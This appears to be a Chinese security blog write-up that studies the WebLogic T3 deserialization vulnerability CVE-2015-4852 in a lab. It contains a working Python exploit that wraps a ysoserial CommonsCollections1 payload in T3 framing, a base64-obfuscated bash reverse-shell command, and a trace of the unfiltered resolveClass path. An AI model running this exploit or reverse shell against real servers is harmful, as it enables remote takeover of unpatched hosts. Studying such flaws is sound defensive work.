## 前言

这篇文章主要是学习Weblogic CVE漏洞中的过程中，对其中的一种利用方式T3协议反序列化漏洞进行分析。

## 前置

### 什么是T3协议？

T3协议是一种Weblogic RMI 调用时的通信协议, 对于JAVA RMI(Remote Method Invocation)
来说，基础的通信协议是JRMP，但是Weblogic中的T3协议就是一种优化方案。

T3协议的特点：

  1. 服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。

  2. 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。

### 环境搭建

主要是通过`CVE-2015-4852`这个CVE来进行学习。

对于Weblogic的环境搭建，可以使用下面的这个项目

https://github.com/QAX-A-Team/WeblogicEnvironment

根据项目中的`README`中的描述进行搭建，我这里选用的是`jdk7u21`和`wls10.3.6`版本。

![image-20221002190354071.png](https://image.3001.net/images/20221004/1664844103_633b8147c9587fd8626a5.png!small)

之后需要修改一点Dockerfile中的内容，原项目中的Dockerfile有点问题。

![image-20221002191021337.png](https://image.3001.net/images/20221004/1664844179_633b8193ed37639ca5afd.png!small)

之后就是构建镜像和运行容器

    
    
    ## 创建镜像
    docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar -t weblogic1036jdk7u21 .
    
    ## 运行容器
    docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21
    

成功运行服务

![image-20221002193249606.png](https://image.3001.net/images/20221004/1664844190_633b819ea2eee4168fe1e.png!small)

可以登录管理控制台

    
    
    :7001/console/login/LoginForm.jsp
    

默认账号密码为`weblogic / qaxateam01`

## 正文

### 初尝T3协议

按照`Y4tacker`师傅的描述，我们可以发送一个请求头

    
    
    t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n
    

服务端将会返回一个weblogci的版本号

    
    
    import socket
    
    def T3Test(ip,port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
        sock.sendall(handshake.encode())
        while True:
            data = sock.recv(1024)
            print(data.decode())
    
    if __name__ == "__main__":
        ip = "ip"
        port = port
    
        T3Test(ip,port)
    

![image-20221003075231130.png](https://image.3001.net/images/20221004/1664844200_633b81a8b5c5a42f36b1b.png!small)

`10.3.6`就是我们之前搭建的环境weblogic版本

接下来关注一下T3协议的格式

图片来源于[修复weblogic的JAVA反序列化漏洞的多种方法](http://drops.xmd5.com/static/drops/web-13470.html)

![image-20221003075501827.png](https://image.3001.net/images/20221004/1664844213_633b81b532555d365db29.png!small)

通过T3协议的结构图，我们可以发现，除了第一部分是之前发送的包头，第二到第七部分都是序列化数据，如果我们能够将我们的恶意序列化数据替换其中某一部分的数据，在传入weblogic之后，将会反序列化达到恶意目的。

在Y4tacker中提到了两种攻击方式

>   * 第一种生成方式为，将weblogic发送的JAVA序列化数据的第二到七部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。
>
>   * 第二种生成方式为，将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。
>
>

### 构造攻击

可以发送如下POC

    
    
    from os import popen
    import struct  # 负责大小端的转换
    import subprocess
    from sys import stdout
    import socket
    import re
    import binascii
    
    
    def generatePayload(gadget, cmd):
        YSO_PATH = "E:\\POCgithub\\Java\\tools\\ShiroExploit.V2.51\\ysoserial.jar"
        popen = subprocess.Popen(['java', '-jar', YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)
        return popen.stdout.read()
    
    
    def T3Exploit(ip, port, payload):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
        sock.sendall(handshake.encode())
        data = sock.recv(1024)
        data += sock.recv(1024)
        compile = re.compile("HELO:(.*).0.false")
        print(data.decode())
        match = compile.findall(data.decode())
        if match:
            print("Weblogic: " + "".join(match))
        else:
            print("Not Weblogic")
            return
        header = binascii.a2b_hex(b"00000000")
        t3header = binascii.a2b_hex(
            b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
        desflag = binascii.a2b_hex(b"fe010000")
        payload = header + t3header + desflag + payload
        payload = struct.pack(">I", len(payload)) + payload[4:]
        sock.send(payload)
    
    
    if __name__ == "__main__":
        ip = "192.168.153.136"
        port = 7001
        gadget = "CommonsCollections1"
        cmd = "bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4yLjE0OS84MDAwIDwmMSc=}|{base64,-d}|{bash,-i}"
        payload = generatePayload(gadget, cmd)
        T3Exploit(ip, port, payload)
    

对于这个POC，就是因为把ysoserial生成的payload变成t3协议里的数据格式。

  * 数据包长度包括了自身长度和其他三部分数据包长度，所以需要先占位，计算出长度后再替换进去；

  * T3协议头是固定的，直接硬编码进去就行；

  * 反序列化标志+数据=weblogic反序列化标志`fe010000`+ysoserial生成的序列化数据。

因为在Weblogic中默认存在有CC依赖，所以能够通过CC链的方式进行反序列化利用。

![image-20221003083351370.png](https://image.3001.net/images/20221004/1664844223_633b81bf88367aeab867b.png!small)

在运行该POC之后，能够收到shell反弹

![image-20221003083423827.png](https://image.3001.net/images/20221004/1664844230_633b81c6132d0c474bb0a.png!small)

我们抓包追踪一下TCP流

![image-20221003084644854.png](https://image.3001.net/images/20221004/1664844235_633b81cbd8aedd8108791.png!small)

前面红色部分就是我们的请求头。

蓝色部分就是Weblogic返回的响应头，第二个红色部分前面应该是前面T3协议结构中提到了的其他数据部分吧，从图中可以看见高亮部分是`ac
ed`头，这是序列化数据的标志，在其之后都是序列化数据，也就是CC链的序列化数据。

因为，在POC中是直接将payload添加进入请求体。

![image-20221003085125138.png](https://image.3001.net/images/20221004/1664844243_633b81d36098fc469f2a3.png!small)

### 漏洞分析

对于`weblogic`来说，反序列化的点在`weblogic.rjvm.InboundMsgAbbrev#readObject`方法，打下断点

贴一下这时候的调用栈。

    
    
    readObject:60, InboundMsgAbbrev (weblogic.rjvm)
    read:38, InboundMsgAbbrev (weblogic.rjvm)
    readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
    init:213, MsgAbbrevInputStream (weblogic.rjvm)
    dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
    dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
    dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)
    readReadySocketOnce:967, SocketMuxer (weblogic.socket)
    readReadySocket:899, SocketMuxer (weblogic.socket)
    processSockets:130, PosixSocketMuxer (weblogic.socket)
    run:29, SocketReaderRequest (weblogic.socket)
    execute:42, SocketReaderRequest (weblogic.socket)
    execute:145, ExecuteThread (weblogic.kernel)
    run:117, ExecuteThread (weblogic.kernel)
    

![image-20221003090937467.png](https://image.3001.net/images/20221004/1664844251_633b81db8eb5a4d44e322.png!small)

其中传入的`var1`变量中就存在有我们传入的序列化数据，

![image-20221003091229880.png](https://image.3001.net/images/20221004/1664844259_633b81e39aeb637a25570.png!small)

调用了`var1#read`方法，

![image-20221003091417574.png](https://image.3001.net/images/20221004/1664844272_633b81f0e7ff674e9108a.png!small)

在这个式子的后面部分因为`this.pos() == this.curEndEnvelope`计算为false，所以将会调用父类的read方法。

![image-20221003091649574.png](https://image.3001.net/images/20221004/1664844279_633b81f796f5c89fa69d4.png!small)

直接返回。

因为`var1.read()`方法中返回的结果为0，所以将会进入`case 0`语句，将会调用`(new
InboundMsgAbbrev.ServerChannelInputStream(var1)).readObject()`语句

首先来看前面部分，

![image-20221003092000213.png](https://image.3001.net/images/20221004/1664844285_633b81fdd29b549a0eed9.png!small)

就是一个构造函数，值得注意的是，在向`serverChannel`属性传入数据时候可以发现使用的协议是`t3`协议进行反序列化。

之后进行后面一部分，调用了`readObject`方法，

![image-20221003093457123.png](https://image.3001.net/images/20221004/1664844291_633b8203acc2fc3457ae7.png!small)

但是，`ServerChannelInputStream`类没有重写`readObject`方法，所以，调用的是他的父类`ObjectInputStream#readObject`方法。

对于Java反序列化来说，将会在反序列化中调用`resolveClass`方法读取反序列化的类名，

具体实现在`ObjectInputStream#readNonProxyDesc`方法中。

![image-20221003093940856.png](https://image.3001.net/images/20221004/1664844297_633b82096b1f8f83d21c5.png!small)

调用栈

    
    
    resolveClass:108, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)
    readNonProxyDesc:1610, ObjectInputStream (java.io)
    readClassDesc:1515, ObjectInputStream (java.io)
    readOrdinaryObject:1769, ObjectInputStream (java.io)
    readObject0:1348, ObjectInputStream (java.io)
    readObject:370, ObjectInputStream (java.io)
    readObject:66, InboundMsgAbbrev (weblogic.rjvm)
    

虽然`ServerChannelInputStream`没有重写readObject方法，但是他重写了`resolveClass`方法，跟进看看。

![image-20221003094042914.png](https://image.3001.net/images/20221004/1664844304_633b8210578e5dc4a6b61.png!small)

首先调用父类`ObjectInputStream#resolveClass`方法获取对应类名。

![image-20221003094150457.png](https://image.3001.net/images/20221004/1664844309_633b8215e917ed5eb277f.png!small)

调用`getName`方法获取类名，之后通过Class.forName方法获取对应的类，因为这里的`resolveClass`方法是直接使用的父类的该方法，并没有做出任何的安全过滤操作，所以能够实例化任意类。

之后就是CC1链的部分了，就不分析了。

## 总结

通过这个Weblogic的一个洞，了解并学习了T3协议的攻击手法。

## Ref

[参考](https://github.com/Y4tacker/JavaSec/blob/main/4.Weblogic%E4%B8%93%E5%8C%BA/T3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/T3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0.md)

